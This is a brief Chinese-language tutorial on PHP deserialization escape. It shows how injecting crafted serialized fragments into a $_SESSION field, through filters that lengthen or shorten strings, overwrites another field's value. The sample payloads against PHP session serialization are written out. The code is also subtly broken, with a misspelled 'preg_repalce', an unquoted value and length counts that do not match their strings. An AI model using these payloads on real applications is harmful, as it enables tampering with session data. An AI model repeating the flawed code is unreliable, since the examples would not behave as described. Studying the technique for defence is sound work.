#反序列化逃逸

##关键词增多的逃逸
```
<?php
 
$_SESSION['user']='get';
$_SESSION['function']='fun';

echo serialize($_SESSION);

?>
```

此时输出的会是$_SESSION序列化的值
```
a:2:{s:4:"user";s:3:"get";s:8:"function";s:3:"fun";} 
```

此时我想更改function的值，我们可以增加关键词数
```
_SESSION['user']=get";s:8:"function";s:4:"funs";}
```
此时输出的是
```
a:2:{s:4:"user";s:32:"get";s:8:"function";s:4:"funs";}";s:8:"function";s:3:"fun";} 
```

在反序列化中以分号作为分隔，以}作为结束，因此逃逸出了";s:8:"function";s:3:"fun";}，这逃逸出来的部分会被忽视掉
此时function值就发生了改变


##关键词减少的逃逸
```
<?php
 

function fittle($img){
$array=array('user','flag');
$iop='/'.implode("|",$array).'/i';
return preg_repalce($iop,"",$img);
}
 
$_SESSION['user']='get';
$_SESSION['function']=fun;

echo fittle(serialize($_SESSION));

?>
```
如果?f=fun，此时输出的是：
```
a:2:{s:4:"";s:3:"get";s:8:"function";s:3:"fun";} 
```

此时我们看到user被过滤掉了，而字符串数仍然为4，不变，所以容易造成逃逸

我们可以构造多个user来逃逸
```
_SESSION['user']=useruseruser";s:3:"get";s:8:"function";s:3:"funs";s:3:"abb";}

```

此时得出的结果为：
```
a:2:{s:4:"user";s:61:"useruseruser";s:3:"get";s:8:"function";s:3:"funs";s:3:"abb";}";s:8:"function";s:3:"fun";} 
```

可见";s:8:"function";s:3:"fun";} 这部分逃逸出来，被忽视掉，function值发生改变